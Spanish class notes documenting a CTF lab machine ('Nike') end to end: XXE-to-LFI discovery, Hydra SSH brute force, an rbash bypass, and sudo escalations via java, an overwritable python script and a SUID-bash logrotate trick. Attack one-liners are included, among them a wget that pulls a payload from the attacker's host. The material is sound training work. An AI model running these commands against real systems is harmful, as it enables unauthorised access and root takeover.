| **Campo** | **Detalle** |
| --- | --- |
| **SesiÃ³n** | 27 â€” XXE â†’ LFI y escaladas encadenadas |
| **Instructor** | Carlos Castillo |
| **Fecha** | 13/07/2026 |
| **MÃ¡quina** | Nike (TheHackerLabs, nÂº 170) |
| **Tipo de clase** | Repaso prÃ¡ctico end-to-end: metodologÃ­a web completa + escalada Linux |

| |
|---|
|**â„¹ INFO**<br><br>Contexto de la sesiÃ³n: Repaso completo de la mÃ¡quina Nike, ya vista parcialmente con Carlos GÃ³mez. El foco no es la flag, sino el **razonamiento y la metodologÃ­a**: cÃ³mo detectar el XXE forzando la web poco a poco, cÃ³mo pivotar de un LFI a informaciÃ³n Ãºtil, y cÃ³mo encadenar tres escaladas/movimientos laterales de dificultad creciente vÃ­a `sudo -l`.|

# **1. Objetivos de la sesiÃ³n**

â€¢ Repasar la **metodologÃ­a web** completa sobre una mÃ¡quina real: enumeraciÃ³n â†’ descubrimiento â†’ explotaciÃ³n â†’ post-explotaciÃ³n.

â€¢ Detectar y explotar una **inyecciÃ³n XXE** (XML External Entity) en `upload.php` forzando la aplicaciÃ³n de forma incremental.

â€¢ Convertir el XXE en un **LFI** (Local File Inclusion) para leer archivos del sistema y extraer credenciales.

â€¢ Realizar **fuerza bruta SSH** dirigida con Hydra a partir de usuarios y contraseÃ±as obtenidos.

â€¢ Aprender a hacer **bypass de una shell restringida (rbash)** al conectar por SSH.

â€¢ Encadenar **tres movimientos laterales / escaladas** apoyÃ¡ndose en `sudo -l` y GTFOBins, con dificultad creciente (java â†’ python â†’ logrotate/dd).

# **2. Conceptos clave**

## **GET vs POST**

Explicado en clase de forma sencilla: **GET** pide informaciÃ³n al servidor y la devuelve ("quiero esto, dÃ¡melo"). **POST** envÃ­a informaciÃ³n que el servidor tiene que **validar o comprobar** antes de responder (un formulario, un login, un bloque XML...).

| |
|---|
|âš  **Regla prÃ¡ctica**<br><br>Cuando vayas a enviar datos para que el servidor los procese, cambia el mÃ©todo a POST. Muchas veces funciona sin cambiarlo, pero otras peta. En Burp: clic derecho â†’ *Change request method*, o edÃ­talo a mano. En curl, `-X POST` (aunque con `-d` ya se sobreentiende).|

## **XXE â€” XML External Entity**

Vulnerabilidad que aparece cuando un **parser de XML** procesa entidades definidas por el usuario sin restringirlas. En XML, una **entidad** es como una variable. Si ademÃ¡s se permiten **entidades externas** con la palabra clave SYSTEM, podemos hacer que el parser vaya a buscar el contenido de un archivo (o una URL) del servidor y lo refleje en la respuesta.

| |
|---|
|â„¹ **AmpliaciÃ³n**<br><br>La entidad externa SYSTEM admite varios wrappers: `file://` para leer archivos locales, pero tambiÃ©n `http://` o `ftp://` para hacer llamadas salientes. En esta mÃ¡quina nos quedamos en `file://` para leer del sistema.|

## **LFI â€” Local File Inclusion**

Capacidad de **leer archivos locales** del servidor a los que en principio no deberÃ­amos acceder. AquÃ­ el LFI es la consecuencia del XXE: podemos leer ficheros, pero **no listar directorios**. Como mucho leemos rutas que conocemos o intuimos por el contexto (`/etc/passwd`, la ruta de la web, claves privadas...).

| |
|---|
|âš  **AVISO**<br><br>No sabes si un archivo "no responde" porque no existe o porque no tienes permiso para leerlo: no ves el output que lo distinga. Es una de las problemÃ¡ticas tÃ­picas del hacking: el contexto que no controlas.|

## **rbash â€” shell restringida (enjaulada)**

rbash (restricted bash) es una shell enjaulada. La **r** viene de *restringida* (regla mnemotÃ©cnica de clase). Impide, entre otras cosas: cambiar de directorio (`cd`), usar rutas con `/` en comandos, redirigir salidas, modificar variables de entorno y ejecutar comandos con rutas absolutas.

# **3. Desarrollo tÃ©cnico**

Cadena completa de explotaciÃ³n de la mÃ¡quina Nike, en el orden real de la sesiÃ³n:

## **3.1 EnumeraciÃ³n inicial**

Descubrimiento del host con Netdiscover y escaneo con Nmap. El **TTL 64** en el ping indica que el objetivo es **Linux** (dato de contexto Ãºtil para despuÃ©s).

Resultado del escaneo: solo **dos puertos**.

| Puerto | Servicio | Notas |
| :---- | :---- | :---- |
| 22 | SSH | Nada que hacer aquÃ­ de primeras (paso habitual). |
| 80 | HTTP â€” Apache 2.4 | Poca informaciÃ³n. Conviene tener en cuenta la versiÃ³n por si hay algÃºn CVE. |

| |
|---|
|â„¹ **MetodologÃ­a**<br><br>Antes de lanzar Gobuster, **analiza la web a mano** (metodologÃ­a pasiva): funcionalidades, formularios, contacto, emails. WhatWeb detectÃ³ un email en la pÃ¡gina. No te fÃ­es al 100% de la herramienta, pero en webs enormes puede rescatar informaciÃ³n que se te pasarÃ­a.|

## **3.2 Descubrimiento de contenido**

Fuzzing de directorios y ficheros con Gobuster (o Dirsearch / Feroxbuster / ffuf / wfuzz, equivalentes). Aparecen ficheros PHP con "chicha", entre ellos `upload.php` y `datos.php`, y un **500 Internal Server Error** interesante que se investiga mÃ¡s adelante.

| |
|---|
|â„¹ **NOTA**<br><br>Gobuster tarda en devolver el 500: primero recorre los 200 y 301 y al final muestra el 500. Un 500 casi siempre es interesante: algo estÃ¡ fallando por detrÃ¡s y puede filtrar informaciÃ³n.|

## **3.3 DetecciÃ³n del XXE en upload.php**

MetodologÃ­a incremental: no lanzamos el payload final de golpe, vamos **forzando la aplicaciÃ³n poco a poco** y observando cÃ³mo responde en cada paso.

**Paso 1 â€” PeticiÃ³n vacÃ­a.** El servidor responde que falta algo ("no proporcionado"). AdemÃ¡s, el mensaje de error menciona `startup`, `expected`, un `<` (menor que) *not found*: pistas de que hay un **parser de XML de PHP** detrÃ¡s.

**Paso 2 â€” Cambiar GET a POST** y enviar un parÃ¡metro cualquiera (el nombre da igual, p. ej. `mail=test`). Se envÃ­a **data** para que el servidor la valide.

**Paso 3 â€” Bloque XML bÃ¡sico.** El PHP lo **parsea** y lo refleja tal cual (cÃ³digo 200). "Le ha gustado": el XML llega al servidor y vuelve. Confirmado que interpreta XML.

**Paso 4 â€” Declarar una entidad interna** (una variable, p. ej. `example` o `ENT`) y llamarla en un campo (`lastName`). El parser la **resuelve** y devuelve su valor. Cada vez apretamos mÃ¡s.

**Paso 5 â€” Entidad externa `SYSTEM`.** Como no pone pega a las variables ni a los parÃ¡metros y devuelve 200, pedimos ya algo crÃ­tico: leer un archivo del sistema con `file://`.

| |
|---|
|âš  **ExplotaciÃ³n en laboratorio autorizado**<br><br>Estructura del payload XXE usado (declaraciÃ³n DOCTYPE + entidad externa SYSTEM que apunta a `file:///etc/passwd`, invocada dentro del campo `lastName` del bloque `userInfo`). La entidad SYSTEM es la que permite ir a buscar el valor dentro del servidor. No se reproduce el payload literal: recrÃ©alo desde GTFOBins/HackTricks o con ayuda de la documentaciÃ³n de XXE.|

**Paso 6 â€” Lectura de `/etc/passwd`.** Se obtiene la lista de usuarios. De ellos, 5 pueden loguearse (`/bin/bash`); uno tiene una shell distinta del resto (rbash, restringida) y otro es root.

## **3.4 Del XXE al LFI: leer la web y las credenciales**

Sabiendo que es Linux, la ruta base habitual de las webs es `/var/www/html`. Cambiando el objetivo de la entidad de `/etc/passwd` a `/var/www/html/datos.php` leemos el **cÃ³digo/credenciales** de ese fichero. Recuerda: en PHP, si el fichero se **interpreta**, no ves su cÃ³digo; pero leyÃ©ndolo como archivo vÃ­a LFI sÃ­ obtenemos su contenido en crudo.

| |
|---|
|â„¹ **QuÃ© extraer con un LFI**<br><br>Con un LFI no te limites a `/etc/passwd`. Puedes sacar: la ruta donde estÃ¡ alojada la web, `.bash_history`, y sobre todo claves privadas SSH en `/home/<usuario>/.ssh/id_rsa`. Existen diccionarios especÃ­ficos de LFI en SecLists (busca "LFI" o "local file inclusion") con rutas por defecto segÃºn el sistema operativo.|

| |
|---|
|â„¹ **AmpliaciÃ³n**<br><br>Idea de proyecto lanzada en clase: una herramienta que detecte la tecnologÃ­a de la web (p. ej. un framework tipo ColdFusion), descargue su documentaciÃ³n y **genere un diccionario especÃ­fico** de rutas por defecto para probarlo automÃ¡ticamente si hay un LFI. Encaja con RedNotes / automatizaciÃ³n.|

## **3.5 Acceso inicial: Hydra sobre SSH**

Con los usuarios y contraseÃ±as extraÃ­dos de `datos.php` (guardados en dos ficheros de texto, `usuarios` y `password`), se lanza Hydra contra SSH para encontrar la combinaciÃ³n vÃ¡lida. Resultado: el usuario **mike** con su contraseÃ±a (password ok).

## **3.6 Bypass de rbash al conectar por SSH**

Al conectar por SSH con mike caemos en una **rbash**: casi todo estÃ¡ restringido, no podemos movernos ni listar. El bypass es sencillo: al establecer la conexiÃ³n SSH le especificamos **quÃ© terminal queremos** que se inicie, forzando bash en lugar de rbash.

| |
|---|
|âœ“ **TÃ©cnica de bypass**<br><br>El bypass consiste en indicar a SSH la shell/terminal a lanzar antes de entrar (parÃ¡metro `-t` para asignar una pseudo-terminal y pedir bash). AquÃ­ la rbash estÃ¡ muy poco restringida, asÃ­ que no te compliques: fuerza bash y listo. Comando en una sola lÃ­nea (ver secciÃ³n 6).|

Una vez dentro, se puede estabilizar la TTY con `python3 -c 'import pty; pty.spawn("/bin/bash")'`, o con `Ctrl+Z` + `stty raw -echo; fg`.

| |
|---|
|â„¹ **NOTA**<br><br>Diferencia clave vista en clase: aunque el login SSH directo de un usuario estÃ© bloqueado o restringido, muchas veces sÃ­ puedes cambiar a Ã©l una vez dentro con `su <usuario>` + su contraseÃ±a. El contexto influye muchÃ­simo; no todo tiene una respuesta Ãºnica.|

## **3.7 Movimientos laterales y escaladas (sudo -l)**

El corazÃ³n didÃ¡ctico de la sesiÃ³n: `sudo -l` no es "llegar y ejecutar GTFOBins". Hay que entender **quÃ© puedes ejecutar y quÃ© no**, y adaptarte. Tres casos de dificultad creciente:

## **Caso 1 â€” mike â†’ n vÃ­a java (GTFOBins)**

`sudo -l` muestra que mike puede ejecutar `/usr/bin/java` **como el usuario n** sin contraseÃ±a. Aunque Java sea un lenguaje, aquÃ­ es solo un **binario** que puede *spawnear* una shell. Pasos: crear un `.java` con una clase que llame a `/bin/bash`, pasarlo a la vÃ­ctima, **compilarlo** dentro con `javac`, y ejecutar el `.class` resultante con `sudo -u n`.

| |
|---|
|âš  **Fallos que costaron tiempo en clase**<br><br>Errores reales de la sesiÃ³n: (1) no ejecutes en un directorio sin permisos de escritura para n (p. ej. el escritorio de mike) â€” trabaja siempre en `/tmp`. (2) El nombre del fichero debe coincidir con el de la clase pÃºblica (`Shell.java` con clase `Shell`), o `javac` falla. (3) Se ejecuta el `.class`, no el `.java`.|

Transferencia del archivo: levantar un servidor con `python3 -m http.server <puerto>` en tu Kali y descargarlo en la vÃ­ctima con `wget http://<TU_IP>/Shell.java`. El log cÃ³digo 200 en tu servidor confirma la descarga. **Ojo con usar tu IP correcta**, no `127.0.0.1`.

## **Caso 2 â€” n â†’ pilon vÃ­a python (fichero modificable)**

Ahora el usuario **n** puede ejecutar `sudo -u pilon /usr/bin/python3 /opt/suma.py`. La diferencia: **estÃ¡s obligado a ejecutar ese `suma.py` concreto**, no un script tuyo. Pero el **propietario del fichero es n** â†’ puedes **modificarlo**. Se sobrescribe `suma.py` con un payload Python que spawnea una shell:

```python
import os; os.system("/bin/bash")
```

Al ejecutarlo vÃ­a `sudo -u pilon python3 /opt/suma.py` obtienes shell como **pilon**. `import os` + `os.system(...)` es lo que permite ejecutar comandos del sistema desde Python.

| |
|---|
|â„¹ **NOTA**<br><br>Como el propietario del archivo es n, tambiÃ©n podrÃ­as borrarlo y crear otro con el mismo nombre, pero si puedes modificarlo es lo mÃ¡s cÃ³modo. La ruta en `sudo -l` no comprueba el contenido del fichero, solo la ruta: por eso la modificaciÃ³n funciona.|

| |
|---|
|â„¹ **AmpliaciÃ³n**<br><br>Alternativas al `os.system("/bin/bash")`: una reverse shell en Python (ver revshells.com), o dar SUID a bash desde el script (`chmod u+s /bin/bash`) y luego `bash -p`. Hay mil formas; elige la que entiendas.|

## **Caso 3 â€” logrotate / dd (sin GTFOBins claro)**

El tercer `sudo -l` permite ejecutar `/usr/sbin/logrotate` (y en otra rama, `dd`). AquÃ­ GTFOBins **no da una receta directa clara**, asÃ­ que toca "buscarse la vida" (Google: *logrotate privilege escalation*, HackTricks, o la IA). logrotate gestiona y **rota logs** automÃ¡ticamente segÃºn un fichero de configuraciÃ³n.

TÃ©cnica (logrotate): se prepara un directorio de trabajo en `/tmp` con permisos, un fichero de **log** (puede ir vacÃ­o) y un fichero de **configuraciÃ³n `.conf`** que apunta a ese log con parÃ¡metros como `size 0`, `missingok`, `rotate 1` y un bloque `postrotate`. En el `postrotate` se copia `/bin/bash` a `/tmp` y se le da **SUID** (`chmod u+s`), de modo que al ejecutar logrotate con el usuario privilegiado se genera una bash SUID que luego se lanza con `bash -p`.

| |
|---|
|âš  **ExplotaciÃ³n en laboratorio autorizado**<br><br>En esta mÃ¡quina una reverse shell no funciona bien en la escalada final porque el proceso de logrotate no es estable: mejor spawnear una bash o dar SUID a `/bin/bash`. dd sigue una dinÃ¡mica similar (escritura de ficheros como root/usuario privilegiado). No memorices el payload: entiende que necesitas un `.conf` malicioso y unos parÃ¡metros correctos.|

| |
|---|
|â„¹ **Mensaje del instructor**<br><br>No te agobies con esta escalada: es de nivel avanzado y quizÃ¡ no la vuelvas a ver. El objetivo de verla era que interiorices que `sudo -l` **no es siempre trivial** â€” el contexto puede complicarla mucho, y a veces hay que investigar fuera de GTFOBins.|

# **4. Herramientas utilizadas en la sesiÃ³n**

| Herramienta | Objetivo | Fase de auditorÃ­a | Comando o uso visto | Nivel | Notas |
| :---- | :---- | :---- | :---- | :---- | :---- |
| Netdiscover | Descubrir hosts en la red | EnumeraciÃ³n | `netdiscover` | Practicada | Paso previo al escaneo. |
| Nmap | Puertos y servicios | EnumeraciÃ³n | `nmap -sV -p- IP` | Recurrente | TTL 64 â†’ Linux. Solo 22 y 80. |
| WhatWeb | Fingerprinting web | EnumeraciÃ³n web | `whatweb URL` | Introducida | DetectÃ³ un email. No fiarse al 100%. |
| Wappalyzer | TecnologÃ­as web | EnumeraciÃ³n web | ExtensiÃ³n navegador | Introducida | Apenas dio datos en esta web. |
| Gobuster | Fuzzing de rutas/ficheros | EnumeraciÃ³n web | `gobuster dir -u URL -w wordlist` | Practicada | HallÃ³ upload.php, datos.php y un 500. |
| Burp Suite | Interceptar/editar peticiones | ExplotaciÃ³n web | Proxy + Repeater | Practicada | Cambio GETâ†’POST, envÃ­o de XXE. |
| curl | Peticiones sin GUI | ExplotaciÃ³n web | `curl -X POST -d 'data' URL` | Practicada | Alternativa a Burp. `-F` para subir ficheros. |
| Hydra | Fuerza bruta SSH | Acceso inicial | `hydra -L usuarios -P password ssh://IP` | Practicada | Con listas extraÃ­das de datos.php â†’ mike. |
| SSH | Acceso remoto / bypass rbash | Acceso inicial | `ssh mike@IP -t bash` | Practicada | Fuerza bash sobre rbash. |
| python3 -m http.server | Transferir archivos | Post-explotaciÃ³n | `python3 -m http.server 8000` | Practicada | Servidor web local; wget desde vÃ­ctima. |
| javac / java | Compilar/ejecutar payload | Escalada (GTFOBins) | `sudo -u n /usr/bin/java -cp /tmp Shell` | Introducida | Nombre fichero = clase. Ejecuta .class. |
| python3 (binario) | Ejecutar payload | Escalada (GTFOBins) | `sudo -u pilon python3 /opt/suma.py` | Introducida | `import os; os.system('/bin/bash')`. |
| logrotate | Escalada por config maliciosa | Escalada | `sudo logrotate -f config.conf` | Introducida | Nuevo. postrotate â†’ SUID bash. |
| dd | Escritura como privilegiado | Escalada | `sudo dd if=... of=...` | Mencionada | Nuevo. Rama alternativa, no explotada a fondo. |
| GTFOBins | Recetas de abuso de binarios | Escalada | gtfobins.github.io | Recurrente | java y python sÃ­; logrotate no cubierto. |

# **5. Comandos importantes**

Todos en una sola lÃ­nea. Sustituye IP, TU_IP, puertos, usuarios y rutas por los reales del laboratorio.

## **EnumeraciÃ³n**

```bash
netdiscover -i eth0; nmap -sV -p- IP; whatweb http://IP/; gobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.txt -x php
```

## **XXE / LFI (curl)**

PeticiÃ³n POST con `-d` (data). Con `-X POST` explÃ­cito para dejarlo claro; `-F` serÃ­a para subir ficheros. El payload XML va entre comillas simples.

```bash
curl -X POST -d '<BLOQUE_XML_XXE>' http://IP/upload.php
```

| |
|---|
|âš  **AVISO**<br><br>El `<BLOQUE_XML_XXE>` es el DOCTYPE con la entidad externa SYSTEM apuntando a `file:///etc/passwd` (o a `/var/www/html/datos.php`, o a `/home/<user>/.ssh/id_rsa`) e invocada en `lastName`. No se reproduce literal: recrÃ©alo desde HackTricks/GTFOBins.|

## **Fuerza bruta SSH y bypass rbash**

```bash
hydra -L usuarios.txt -P password.txt ssh://IP; ssh mike@IP -t bash; python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## **Transferencia de archivos**

```bash
python3 -m http.server 8000; wget http://TU_IP:8000/Shell.java -O /tmp/Shell.java
```

## **Escaladas / movimientos laterales**

```bash
sudo -l; javac /tmp/Shell.java; sudo -u n /usr/bin/java -cp /tmp Shell; echo 'import os; os.system("/bin/bash")' > /opt/suma.py; sudo -u pilon /usr/bin/python3 /opt/suma.py; chmod u+s /bin/bash; bash -p
```

| |
|---|
|âš  **Recordatorio java**<br><br>El nombre del `.java` debe coincidir con la clase pÃºblica que contiene (aquÃ­ `Shell`), o `javac` fallarÃ¡. Ejecuta siempre el `.class` compilado, y hazlo en un directorio escribible por el usuario destino (`/tmp`).|

# **6. Riesgos, errores comunes y buenas prÃ¡cticas**

| |
|---|
|âš  **Alcance**<br><br>Todo el contenido es para laboratorios autorizados (TheHackerLabs, HTB, entornos propios). No lo apliques sobre sistemas de terceros sin permiso explÃ­cito.|

| |
|---|
|âš  **AVISO**<br><br>**Trabaja siempre en `/tmp`** para movimientos laterales: evita el error de ejecutar payloads en directorios sin permisos para el usuario destino (le pasÃ³ al instructor y perdiÃ³ media hora).|

| |
|---|
|âš  **AVISO**<br><br>**Nombre de fichero = clase** en Java; ejecuta el `.class`, no el `.java`. Comprueba tu **IP real** (`ifconfig`/`ip a`) antes de servir/descargar archivos: usar una IP antigua o `127.0.0.1` es un fallo tÃ­pico.|

| |
|---|
|âœ“ **CORRECTO**<br><br>MetodologÃ­a incremental: **no vayas dos pasos por delante**. Lanza, mira, analiza el cÃ³digo de estado (200/500), y decide. Prueba-error **con anÃ¡lisis**, no a ciegas.|

| |
|---|
|â„¹ **Uso de IA**<br><br>Usa la IA con criterio para generar/depurar payloads XXE o revshells, y para valorar defensas (p. ej. `libxml_disable_entity_loader` / `LIBXML_NOENT`), pero **entiende la lÃ³gica** antes de copiar. Anthropic ofrece un formulario para usos de ciberseguridad legÃ­timos si un modelo bloquea peticiones de laboratorio.|

# **7. ConexiÃ³n con sesiones anteriores**

Esta sesiÃ³n **consolida y encadena** tÃ©cnicas ya introducidas en la mÃ¡quina Castor (sesiÃ³n ~26) y en Banco y Rockstar:

â€¢ **XXE como vector de LFI**: ya visto en Castor con `upload.php` y extracciÃ³n de `/etc/passwd`. AquÃ­ se refuerza la *metodologÃ­a incremental* de detecciÃ³n.

â€¢ **LFI / Path Traversal**: trabajado en Banco. Se amplÃ­a con quÃ© extraer (claves privadas, rutas de la web, diccionarios LFI de SecLists).

â€¢ **Hydra + SSH**: misma dinÃ¡mica que en Castor (brute-force SSH tras obtener usuarios/contraseÃ±as).

â€¢ **GTFOBins y `sudo -l`**: en Banco/Rockstar se vieron SUID, sudoers, sustituciÃ³n de binarios y cron. Hoy se aÃ±ade el matiz de que `sudo -l` **no siempre es trivial** (caso logrotate/dd sin receta directa).

â€¢ **EstabilizaciÃ³n de TTY y transferencia con `python3 -m http.server`**: patrÃ³n recurrente de post-explotaciÃ³n.

Herramientas **nuevas** respecto al registro acumulado: `logrotate` y `dd` como binarios de escalada (antes no aparecÃ­an).

# **8. Resumen final**

La mÃ¡quina Nike (TheHackerLabs, nÂº 170) es una cadena web completa. Se enumera (Nmap: 22 y 80, Linux por TTL 64), se descubre `upload.php` y `datos.php` con Gobuster, y se detecta un **XXE** forzando la app paso a paso: peticiÃ³n vacÃ­a â†’ POST â†’ XML bÃ¡sico â†’ entidad interna â†’ entidad externa SYSTEM. Ese XXE se convierte en **LFI** para leer `datos.php` y extraer credenciales; con **Hydra** sobre SSH se obtiene el usuario **mike**, cuya **rbash** se **bypassea** forzando bash en la conexiÃ³n. Desde ahÃ­, tres saltos vÃ­a `sudo -l`: **mikeâ†’n** (java/GTFOBins), **nâ†’pilon** (python, fichero modificable) y una **escalada final** con **logrotate**/**dd** (SUID a bash). El mensaje central: la metodologÃ­a no cambia, pero el contexto sÃ­; el `sudo -l` exige entender quÃ© puedes ejecutar y adaptarte.

# **9. Checklist de repaso**

â˜ Enumerar con Netdiscover + Nmap e identificar el SO por TTL.

â˜ Analizar la web a mano (WhatWeb/Wappalyzer, emails, formularios) antes de Gobuster.

â˜ Fuzzear rutas y localizar ficheros PHP y cÃ³digos de error (500).

â˜ Detectar XXE de forma incremental: vacÃ­o â†’ POST â†’ XML â†’ entidad interna â†’ entidad externa SYSTEM.

â˜ Convertir el XXE en LFI: leer `/etc/passwd`, `/var/www/html/datos.php`, claves privadas.

â˜ Extraer usuarios y contraseÃ±as; lanzar Hydra sobre SSH.

â˜ Hacer bypass de rbash forzando bash en la conexiÃ³n SSH y estabilizar la TTY.

â˜ Leer `sudo -l` en cada usuario y consultar GTFOBins; adaptarse si no hay receta directa.

â˜ Encadenar: java (mikeâ†’n) â†’ python/suma.py (nâ†’pilon) â†’ logrotate/dd (SUID bash).

â˜ Trabajar siempre en `/tmp`; verificar IP real antes de transferir archivos.

# **10. ActualizaciÃ³n del registro de herramientas**

Bloque copiable a la base de conocimiento del proyecto. Entradas nuevas y cambios de nivel derivados de esta sesiÃ³n:

| Herramienta | Nivel |
| :---- | :---- |
| logrotate | Introducida (NUEVA â€” escalada por config maliciosa) |
| dd | Mencionada (NUEVA â€” escritura como privilegiado) |
| javac / java (binario) | Introducida (escalada GTFOBins) |
| python3 (binario, sudo) | Introducida (escalada GTFOBins) |
| python3 -m http.server | Practicada (transferencia de archivos) |
| WhatWeb | Introducida â†’ reforzada (fingerprinting + emails) |
| Hydra | Introducida â†’ Practicada (brute-force SSH real) |
| curl | Practicada (explotaciÃ³n XXE/LFI sin GUI) |
| SSH (bypass rbash) | Practicada (ssh -t bash) |
| GTFOBins | Recurrente (java, python; logrotate no cubierto) |

â†’

| |
|---|
|âœ“ **Para consolidar**<br><br>Concepto nuevo a fijar para la prÃ³xima: **SUID a /bin/bash** como tÃ©cnica de escalada (`chmod u+s /bin/bash` â†’ `bash -p`), y la idea de que logrotate/dd escalan por **escritura de ficheros**, no por shell directa.|

â†’

â†’

